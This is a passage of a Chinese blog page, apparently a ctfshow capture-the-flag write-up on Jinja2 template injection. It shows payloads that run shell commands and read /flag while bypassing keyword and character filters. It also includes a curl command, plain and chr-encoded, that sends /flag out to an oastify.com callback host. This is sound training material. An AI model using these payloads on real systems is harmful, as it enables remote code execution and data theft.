@@ -1,0 +1,957 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctfshow SSTI 与过滤绕过：关键字、字符与长度限制。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow SSTI 与过滤绕过">
+<meta property="og:url" content="https://xendr1a.github.io/2025/10/05/ctfshow-ssti/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="ctfshow SSTI 与过滤绕过：关键字、字符与长度限制。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-05T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.968Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="SSTI">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ctfshow SSTI 与过滤绕过 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">ctfshow SSTI 与过滤绕过</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-05 10:00" pubdate>
+          2025年10月5日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          22k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow SSTI 与过滤绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>无过滤</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()&#125;&#125;#查<br>?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[132].__init__.globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>过滤了数字2，3</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[140-8].__init__.globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><p>过滤了’ ‘和” “</p>
+<p>可以用()或者[]绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.ary1](request.args.ary2).read()&#125;&#125;&amp;ary1=popen&amp;ary2=cat+/flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><p>过滤了arg</p>
+<p>我们还有</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">request.cookies.    #cookie传参<br>request.values.    <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.ary1](request.values.ary2).read()&#125;&#125;&amp;ary1=popen&amp;ary2=cat+/flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><p>过滤了’’和[]和arg</p>
+<p>可以使用getitem</p>
+<p><code>__getitem__(132)==[132]</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=cat /flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><p>过滤加了个_</p>
+<p>request.values可以绕过，但是太长了，这里学习到了一种新方法</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">lipsum 是一个 Python 函数对象，其 __globals__ 属性会返回 该函数所在模块的全局变量字典。<br>lipsum.__globals__含有os模&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">| attr 是一个 过滤器（Filter），用于 动态访问对象的属性或方法<br><br>&quot;&quot;|attr(&quot;__class__&quot;)<br>相当于<br>&quot;&quot;.__class__<br><br>&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;<br>&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125; <br>  (lipsum | attr(&quot;__globals__&quot;))          &#123;# 获取 lipsum 的全局变量字典 #&#125;<br>  | attr(&quot;__getitem__&quot;)(&quot;os&quot;)             &#123;# 获取 os 模块 #&#125;<br>  | attr(&quot;popen&quot;)(&quot;id&quot;)                   &#123;# 调用 os.popen #&#125;<br>  | attr(&quot;read&quot;)()                        &#123;# 读取命令结果 #&#125;<br>&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在过滤.的时候也可以使用| attr</p>
+<h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><p>经测试多过滤了一个os</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;&#123;&#123;% endraw %&#125;(lipsum | attr(request.values.a)).get(request.values.c).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag&amp;c=os<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">先说说get<br>在python中，get() 是字典（dict）类型的一个内置方法，用于安全地获取字典中某个键（key）对应的值（value）。它的核心作用是 避免直接通过键访问时可能引发的 KeyError 异常，并提供默认值功能。<br></code></pre></td></tr></table></figure>
+
+<p>关于这里为什么用get呢</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Jinja2 模板语法中，属性访问必须通过 . 或 [] 完成，不能动态拼接属性名。<br>(lipsum | attr(request.values.a)).(request.values.c) 访问属性，这种写法是 非法的。<br>通过get获得c的值是合法的，使用 .get() 方法可以动态从请求参数中提取键名，进而访问 lipsum.__globals__ 字典中的 os 模块。<br></code></pre></td></tr></table></figure>
+
+<h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><p>加了个过滤{{</p>
+<p>我们可以使用{%printf%}，绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=&#123;% raw %&#125;&#123;%&#123;% endraw %&#125;print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set po=dict(po=a,p=a)|join%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set a=(()|select|string|list)|attr(po)(24)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set chr=x.chr%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125;print(x.open(file).read())%&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><p>应该是数字没了</p>
+<p>面向wp做题，发现可以用全角符号绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set po=dict(po=a,p=a)|join%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set a=(()|select|string|list)|attr(po)(２４)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set chr=x.chr%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125;print(x.open(file).read())%&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">脚本<br>def half2full(half):<br>    full = &#x27;&#x27;<br>    for ch in half:<br>        if ord(ch) in range(33, 127):<br>            ch = chr(ord(ch) + 0xfee0)<br>        elif ord(ch) == 32:<br>            ch = chr(0x3000)<br>        else:<br>            pass<br>        full += ch<br>    return full<br>while 1:<br>    t = &#x27;&#x27;<br>    s = input(&quot;输入想要转换的数字字符串：&quot;)<br>    for i in s:<br>        t += half2full(i)<br>    print(t)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h3><p>又加了一个过滤print</p>
+<p>方法，用的是curl外带加chr()绕过</p>
+<p>curl -X POST -F xx&#x3D;@&#x2F;flag <a target="_blank" rel="noopener" href="http://301vogfw8sfhp6fewko0404ch3nublza.oastify.com/">http://301vogfw8sfhp6fewko0404ch3nublza.oastify.com</a></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">#佬的脚本chr字符脚本<br>def half2full(half):<br>    full = &#x27;&#x27;<br>    for ch in half:<br>        if ord(ch) in range(33, 127):<br>            ch = chr(ord(ch) + 0xfee0)<br>        elif ord(ch) == 32:<br>            ch = chr(0x3000)<br>        else:<br>            pass<br>        full += ch<br>    return full<br>string = input(&quot;你要输入的字符串：&quot;)<br>result = &#x27;&#x27;<br>def str2chr(s):<br>    global  result<br>    for i in s:<br>        result += &quot;chr(&quot;+half2full(str(ord(i)))+&quot;)%2b&quot;<br>str2chr(string)<br>print(result[:-3])<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set po=dict(po=a,p=a)|join%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set a=(()|select|string|list)|attr(po)(２４)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set ohs=(dict(o=a,s=a)|join)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set chr=x.chr%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１１５)%2bchr(１０３)%2bchr(９９)%2bchr(１０７)%2bchr(５２)%2bchr(５３)%2bchr(１１８)%2bchr(１０８)%2bchr(１１１)%2bchr(１０４)%2bchr(１１８)%2bchr(５４)%2bchr(５３)%2bchr(１１８)%2bchr(１１８)%2bchr(５１)%2bchr(９９)%2bchr(５７)%2bchr(５２)%2bchr(１１２)%2bchr(１０７)%2bchr(１１２)%2bchr(１０７)%2bchr(４９)%2bchr(１２０)%2bchr(１１５)%2bchr(５１)%2bchr(１０６)%2bchr(１１４)%2bchr(５７)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; if ((lipsum|attr(glo)).get(ohs).popen(cmd))%&#125;<br>abc #测试的<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; endif %&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="web369-1"><a href="#web369-1" class="headerlink" title="web369"></a>web369</h2><p>这题我想单独学习一下payload的思路</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">?name=<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set po=dict(po=a,p=a)|join%&#125;<br>#这里是运用到了python字典的知识dict(po=a, p=a) 会生成字典 &#123;&quot;po&quot;: a, &quot;p&quot;: a&#125;。<br>#|join 将字典的 键（keys） 合并为字符串，即 &quot;pop&quot;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set a=(()|select|string|list)|attr(po)(24)%&#125;<br>#这里单独放下面讲，就是让a=_<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;<br>#这里是__init__下面以此类推<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<br>#这里联合上面的值，访问 __builtins__ 模块。（为了使用chr<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set chr=x.chr%&#125;<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;<br>#chr(47) → /，chr(102) → f，chr(108) → l，chr(97) → a，chr(103) → g，组合成 /flag。<br>#x.open(file).read() 调用 open(&#x27;/flag&#x27;).read()。<br>&#123;% raw %&#125;&#123;%&#123;% endraw %&#125;print(x.open(file).read())%&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">&#123;% raw %&#125;&#123;%&#123;% endraw %&#125; set a=(()|select|string|list)|attr(po)(24)%&#125;<br>在 Jinja2 模板引擎中，表达式 a=(()|select|string|list).pop(24) 之所以将变量 a 赋值为下划线（_），是因为它利用了模板过滤器的链式操作和生成器对象字符串表示的特定结构<br><br>select 是 Jinja2 的过滤器，通常用于筛选可迭代对象中符合条件的元素。<br>当不传递条件参数时（如 ()|select），它会生成一个空的生成器对象。<br>生成器对象的默认字符串表示形如：<br>&quot;&lt;generator object select_or_reject at 0x...&gt;&quot;<br>| string 将生成器对象转换为字符串：<br>str_result = str(() | select)  # 例如：&#x27;&lt;generator object select_or_reject at 0x7f8c1d3e7a50&gt;&#x27;<br>| list 将字符串转换为字符列表：<br>list_result = list(str_result)  # 例如：[&#x27;&lt;&#x27;, &#x27;g&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, ..., &#x27;_&#x27;, ...]<br>字符串 &quot;&lt;generator object select_or_reject ...&gt;&quot; 的字符索引如下：<br>0: &lt;<br>1: g<br>2: 